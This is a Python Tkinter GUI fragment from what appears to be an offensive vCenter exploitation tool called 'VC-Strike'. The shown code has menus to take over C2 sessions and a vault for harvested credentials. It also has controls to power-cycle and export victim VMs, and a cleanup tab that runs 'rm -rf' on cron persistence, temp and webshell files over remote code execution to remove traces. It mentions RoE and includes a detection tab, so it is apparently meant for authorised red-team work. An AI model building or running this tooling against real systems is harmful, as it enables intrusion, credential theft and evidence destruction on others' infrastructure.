            menu.add_command(label="设为绕过身份（%s）" % upn[:40],
                             command=lambda: self.v590_ident.set(upn))
        menu.tk_popup(event.x_root, event.y_root)

    def _sess_menu(self, event):
        row = self.sess_tree.identify_row(event.y)
        if not row:
            return
        self.sess_tree.selection_set(row)
        sid = int(row)
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="接管此会话",
                         command=lambda: self._c2_use_id(sid))
        menu.add_command(label="探测存活",
                         command=lambda: self._c2_probe_id(sid))
        menu.add_command(label="关闭此会话",
                         command=lambda: self.c2m.close(sid))
        menu.tk_popup(event.x_root, event.y_root)

    def _c2_use_id(self, sid):
        s = self.c2m.get(sid)
        if s:
            self.cur_sess = s
            self._term_append("== 已接管会话 #%d (%s) ==" % (s.id, s.addr))
            self.log("[i] 当前交互会话 → #%d" % s.id, "m")

    def _c2_probe_id(self, sid):
        s = self.c2m.get(sid)
        if s:
            self.log("[*] 会话 #%d 探测中…" % s.id, "m")

    def _cred_menu(self, event):
        row = self.cred_tree.identify_row(event.y)
        if not row:
            return
        key = self.cred_tree.set(row, "key")
        val = self.cred_tree.set(row, "value")
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="复制凭据值",
                         command=lambda: self._copy_text(val, "凭据"))
        menu.add_command(label="复制来源+凭据",
                         command=lambda: self._copy_text("%s = %s" % (key, val), "记录"))
        menu.tk_popup(event.x_root, event.y_root)

    def _act_menu(self, event):
        row = self.act_tree.identify_row(event.y)
        if not row:
            return
        detail = self.act_tree.set(row, "detail")
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="复制详情",
                         command=lambda: self._copy_text(detail, "详情"))
        menu.tk_popup(event.x_root, event.y_root)

    # ---------- 账号库 ----------
    def _acc_refresh(self):
        accs = store.load_accounts()
        labels = ["%s @ %s" % (a["user"], a.get("host", "?")) for a in accs]
        cb = getattr(self, "chain_acc_cb", None)
        if cb:
            cb["values"] = labels
            if labels and not cb.get():
                cb.current(0)
        self._acc_map = dict(zip(labels, accs))

    def _acc_use_chain(self):
        label = self.chain_acc.get()
        a = getattr(self, "_acc_map", {}).get(label)
        if not a:
            messagebox.showinfo("提示", "请先在账号库下拉中选择一条记录")
            return
        self.vch_user.set(a["user"])
        self.vch_pass.set(a["password"])
        if a.get("host"):
            self.vch_host.set(a["host"])
        self.log("[+] 已带入账号库账户 %s（%s）" % (a["user"], a.get("host")), "+")

    def _acc_add(self, host, user, password, source="manual"):
        store.add_account(host, user, password, source=source)
        self._acc_refresh()

    def _acc_del(self):
        label = self.chain_acc.get()
        a = getattr(self, "_acc_map", {}).get(label)
        if not a:
            messagebox.showinfo("提示", "请先选择一条记录")
            return
        if not messagebox.askyesno("二次确认", "从账号库删除 %s @ %s？" %
                                   (a["user"], a.get("host"))):
            return
        accs = [x for x in store.load_accounts()
                if not (x.get("user") == a.get("user")
                        and x.get("host") == a.get("host"))]
        store.save_accounts(accs)
        self._acc_refresh()
        self.log("[i] 账号库已删除: %s" % label, "m")

    # ---------- ⑨ 账号库带入 ----------
    def _vops_use_acc(self):
        accs = store.load_accounts()
        if not accs:
            messagebox.showinfo("提示", "账号库为空（先 ⑧ 打通或 ③ 创建）")
            return
        menu = tk.Menu(self, tearoff=0)
        for a in accs:
            label = "%s @ %s" % (a["user"], a.get("host", "?"))
            menu.add_command(label=label,
                             command=lambda aa=a: self._vops_apply_acc(aa))
        menu.tk_popup(self.winfo_rootx() + 300, self.winfo_rooty() + 150)

    def _vops_apply_acc(self, a):
        self._vv_conn = None
        if a.get("host"):
            self.vv_host.set(a["host"])
        self.vv_user.set(a["user"])
        self.vv_pass.set(a["password"])
        self.log("[+] 已带入账号库账户 %s（记得点登录并刷新）" % a["user"], "+")

    # ---------- ⑨ 排序 ----------
    def _vv_sort(self, col):
        state = getattr(self, "_vv_sort_state", {"col": None, "desc": False})
        desc = (state["col"] == col) and not state["desc"]
        self._vv_sort_state = {"col": col, "desc": desc}
        if col == "name":      # 名称在 #0（tree 列）
            items = [(self.vv_tree.item(k, "text").lower(), k)
                     for k in self.vv_tree.get_children()]
            items.sort(key=lambda t: t[0], reverse=desc)
            for i, (_v, k) in enumerate(items):
                self.vv_tree.move(k, "", i)
            return
        items = [(self.vv_tree.set(k, col), k)
                 for k in self.vv_tree.get_children()]
        if col in ("cpu", "mem"):
            def num(v):
                import re as _re
                m2 = _re.sub(r"[^0-9.]", "", v)
                return float(m2) if m2 else 0.0
            items.sort(key=lambda t: num(t[0]), reverse=desc)
        else:
            items.sort(key=lambda t: t[0].lower(), reverse=desc)
        for i, (_v, k) in enumerate(items):
            self.vv_tree.move(k, "", i)
        for colname in list(self.vv_tree["columns"]):
            base = (self.vv_tree.heading(colname, "text")
                    .replace(" ↓", "").replace(" ↑", ""))
            mark = ""
            if colname == col:
                mark = " ↓" if desc else " ↑"
            self.vv_tree.heading(colname, text=base + mark)

    # ---------- ⑨ 右键菜单 ----------
    def _vv_menu(self, event):
        row = self.vv_tree.identify_row(event.y)
        if not row:
            return
        self.vv_tree.selection_set(row)
        vmid = self.vv_tree.set(row, "vmid")
        name = self.vv_tree.item(row, "text")
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="复制 VM-ID",
                         command=lambda: (self.root.clipboard_clear(),
                                          self.root.clipboard_append(vmid),
                                          self.log("[+] VM-ID 已复制: %s" % vmid, "+")))
        menu.add_command(label="复制名称",
                         command=lambda: (self.root.clipboard_clear(),
                                          self.root.clipboard_append(name)))
        menu.add_separator()
        menu.add_command(label="VM 详情", command=self._vv_detail)
        menu.add_command(label="磁盘清单", command=self._vv_disks)
        menu.add_command(label="快照清单", command=self._vv_snaps)
        menu.add_separator()
        menu.add_command(label="电源 · 开机",
                         command=lambda: self._vv_power_guarded("start", name, vmid))
        menu.add_command(label="电源 · 重启",
                         command=lambda: self._vv_power_guarded("reset", name, vmid))
        menu.add_command(label="电源 · 挂起",
                         command=lambda: self._vv_power_guarded("suspend", name, vmid))
        menu.add_command(label="电源 · 关机",
                         command=lambda: self._vv_power_guarded("stop", name, vmid))
        menu.add_separator()
        menu.add_command(label="导出此 VM（OVA）",
                         command=lambda: (self.vv_expname.set(name),
                                          self._vv_export()))
        menu.tk_popup(event.x_root, event.y_root)

    def _vv_power_guarded(self, action, name, vmid):
        self.vv_action.set(action)
        self.vv_confirm.set(vmid)
        if not messagebox.askyesno(
                "二次确认",
                "对 %s（%s）执行电源操作「%s」？这是对客户资产的写操作，"
                "请确认 RoE 允许。" % (name, vmid, action)):
            return
        self._vv_power_confirm(vmid, name, action)

    def _vv_power_confirm(self, vmid, name, action):
        host, user, password = self._vv_creds()

        def work():
            from .mgmt import MgmtError
            try:
                try:
                    c = self._vv_client(host, user, password)
                    ok, detail = c.power_set(vmid, action)
                except MgmtError as e:
                    s2 = str(e)
                    if "401" in s2 or "认证失败" in s2:
                        self._vv_conn = None
                        c = self._vv_connect(host, user, password)
                        ok, detail = c.power_set(vmid, action)
                    else:
                        raise
                msg = "电源[%s] %s（%s）→ %s" % (action, name, vmid, detail)
                if ok and action in ("start", "reset"):
                    msg += "，当前状态 %s" % c.power_get(vmid)
                elif action == "stop":
                    msg += "（软关机发起，状态需数秒后复查）"
                self.root.after(0, lambda: self._vv_out_append(msg))
                self.log("[%s] %s" % ("+" if ok else "!", msg),
                         "+" if ok else "!")
                self.record("vops-电源", host, "%s %s" % (action, name),
                            "（写操作；如需恢复请执行相反动作）")
            except Exception as e:
                self.log("[!] 电源操作失败: %s" % e, "!")
        self.run_bg(work, "电源操作")

    # ================= Tab6 清理中心 =================
    def _build_tab_clean(self):
        f = self.tab_clean
        f.columnconfigure(0, weight=1)
        f.rowconfigure(2, weight=1)
        top = ttk.Frame(f)
        top.grid(row=0, column=0, sticky="ew", pady=4)
        ttk.Button(top, text="生成清理方案 [F6]", style="Acc.TButton",
                   command=self._clean_gen).pack(side="left")
        ttk.Button(top, text="复制到剪贴板",
                   command=self._clean_copy).pack(side="left", padx=6)
        ttk.Button(top, text="一键清除目标残留（经 RCE）", style="Danger.TButton",
                   command=self._clean_remote).pack(side="left", padx=6)
        ttk.Label(top, text="每个利用动作发生时自动登记到此页", style="Muted.TLabel").pack(
            side="left", padx=10)

        awf = ttk.LabelFrame(f, text="本会话已登记动作")
        awf.grid(row=1, column=0, sticky="ew", pady=4)
        self.act_tree = ttk.Treeview(awf, columns=("time", "type", "target", "detail"),
                                     show="headings", height=6)
        _as = ttk.Scrollbar(awf, orient="vertical", command=self.act_tree.yview)
        self.act_tree.configure(yscrollcommand=_as.set)
        self._tree_resizable(self.act_tree)
        self.act_tree.bind("<Button-3>", self._act_menu)
        for c, t, w in (("time", "时间", 100), ("type", "动作", 130),
                        ("target", "目标", 120), ("detail", "详情", 560)):
            self.act_tree.heading(c, text=t)
            self.act_tree.column(c, width=w, anchor="w")
        _ax = ttk.Scrollbar(awf, orient="horizontal", command=self.act_tree.xview)
        self.act_tree.pack(side="left", fill="x", padx=4, pady=4)
        _as.pack(side="right", fill="y")
        _ax.pack(side="bottom", fill="x")
        self.act_tree.configure(xscrollcommand=_ax.set)

        self.clean_txt = tk.Text(f, bg=COLORS["logbg"], fg=COLORS["fg"],
                                 relief="flat", highlightthickness=1,
                                 highlightbackground=COLORS["border"],
                                 highlightcolor=COLORS["border"],
                                 font=(self.font_family, 9))
        self.clean_txt.grid(row=2, column=0, sticky="nsew", pady=4)
        self.clean_txt.insert("1.0", "（尚无清理方案）\n"
                                     "点击上方「生成清理方案」后，此处显示本次会话的清理步骤清单。\n"
                                     "写入验证 / RCE / WebShell / 账户操作等动作发生时会自动登记。")

    def _clean_remote(self):
        """经 59310 RCE 直接清除目标上本工具的全部残留（含历史常驻 cron）。"""
        host = (self.cur_target.get().strip() or
                self.v59310_host.get().strip()).split(":")[0]
        if not host:
            messagebox.showwarning("提示", "请先在 ① 页设定目标")
            return
        try:
            vport = int(self.v510_vport.get() or 5480)
        except ValueError:
            messagebox.showwarning("提示", "VAMI 端口需为数字")
            return
        port = int(self.v510_port.get() or 514)
        tcp = self.v510_proto.get() in ("TCP", "TLS")
        tls = self.v510_proto.get() == "TLS"
        proxy = self.http_proxy.get().strip() or None
        if not messagebox.askyesno(
                "二次确认", "将通过 RCE 在目标上执行清理命令：\n"
                "rm -rf /etc/cron.d/cve59310* 等全部本工具落点。\n继续？"):
            return
        cmd = ("rm -rf /etc/cron.d/cve59310* /tmp/cve59310_* /tmp/cve59310_check_* "
               "/tmp/ws*-syslog.log /opt/vmware/share/htdocs/r*.txt 2>/dev/null; "
               "echo '--- /etc/cron.d/ after cleanup ---'; ls -la /etc/cron.d/ | head -20")
        tag = rand_name(6)
        self.stop_flag.clear()

        def work():
            self.log("[*] 一键清除目标残留 → %s : %s" % (host, cmd), "i")
            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                    vami_port=vport, proxy=proxy,
                                    poll_cb=lambda s: self.log(s, "m"),
                                    stop_flag=self.stop_flag)
            if ok:
                self.log("[+] 目标残留已清除，/etc/cron.d/ 现状:\n%s" % text, "+")
                self.record("清理-目标残留", host, "rm -rf /etc/cron.d/cve59310* 等",
                            "（本次操作即清理本身）")
            else:
                self.log("[!] %s" % text, "!")
        self.run_bg(work, "清除残留")

    def _clean_gen(self):
        if hasattr(self, "act_tree"):
            self.act_tree.delete(*self.act_tree.get_children())
            for a in self.actions:
                self.act_tree.insert("", "end", values=(
                    a["time"], a["type"], a["target"], a["detail"]))
        lines = ["# ===== VC-Strike 清理方案（%s）=====" % time.strftime("%Y-%m-%d %H:%M:%S"),
                 "# 在目标 vCenter 上（已获得的 root shell / 授权运维通道）执行：", ""]
        if not self.actions:
            lines.append("#（本次会话无登记动作）")
        for a in self.actions:
            lines.append("# %s [%s] %s" % (a["time"], a["type"], a["detail"]))
            lines.append(a["cleanup"])
        lines += ["", "# 通用兜底（59310 全部落点）：",
                  "rm -f /etc/cron.d/cve59310*-syslog.log",
                  "rm -f /tmp/cve59310_* /tmp/cve59310_check_* /tmp/ws*-syslog.log",
                  "rm -f /opt/vmware/share/htdocs/r*.txt "
                  "/opt/vmware/share/htdocs/*-syslog.log",
                  "ls -la /etc/cron.d/ /opt/vmware/share/htdocs/   # 复核",
                  "",
                  "# 59309 创建的账户：按记录逐个 ldapdelete（或经本工具 ③ 删除）",
                  "# IR 排查建议参考 ⑦ 检测与加固"]
        self.clean_txt.delete("1.0", "end")
        self.clean_txt.insert("1.0", "\n".join(lines))
        self.log("[+] 清理方案已生成（%d 项动作）" % len(self.actions), "+")

    def _clean_copy(self):
        txt = self.clean_txt.get("1.0", "end").strip()
        if not txt:
            return
        self.root.clipboard_clear()
        self.root.clipboard_append(txt)
        self.log("[+] 已复制清理命令", "+")

    # ================= Tab7 检测与加固 =================
    def _build_tab_detect(self):
        f = self.tab_detect
        f.columnconfigure(0, weight=1)
        f.rowconfigure(1, weight=1)
        top = ttk.Frame(f)
        top.grid(row=0, column=0, sticky="ew", pady=4)
        ttk.Button(top, text="复制全部",
                   command=lambda: (self.root.clipboard_clear(),
                                    self.root.clipboard_append(DETECTION_TEXT),
                                    self.log("[+] 已复制", "+"))).pack(side="left")
        ttk.Label(top, text="防御侧自查 / 排查 / 缓解 —— 来自公开 POC 仓库与 QTR IR 案例",
                  style="Muted.TLabel").pack(side="left", padx=8)
        t = tk.Text(f, bg=COLORS["logbg"], fg=COLORS["fg"], relief="flat",
                    font=(self.font_family, 9))
        t.grid(row=1, column=0, sticky="nsew", pady=4)
        from .data import ABOUT_TEXT, REFERENCES
        refs = "\n".join("- %s: %s" % (n, u) for n, u in REFERENCES)
        t.insert("1.0", ABOUT_TEXT + "\n\n" + DETECTION_TEXT +
                 "\n\n【参考链接】\n" + refs)
        t.configure(state="disabled")


def ensure_dpi_awareness():
    """声明 Per-Monitor DPI 感知：否则 Windows 位图拉伸整个窗口，文字发糊，
    且 Tk 坐标与物理像素错位（截图/多显示器均受影响）。必须在创建 Tk 前调用。"""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)   # PER_MONITOR_DPI_AWARE
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass


def run_gui():
    if tk is None:
        print("未找到 tkinter（无显示环境？）。请使用 CLI：python -m vcstrike --help")
        return 1
    ensure_dpi_awareness()
    root = tk.Tk()
    ToolApp(root)
    root.mainloop()
    return 0
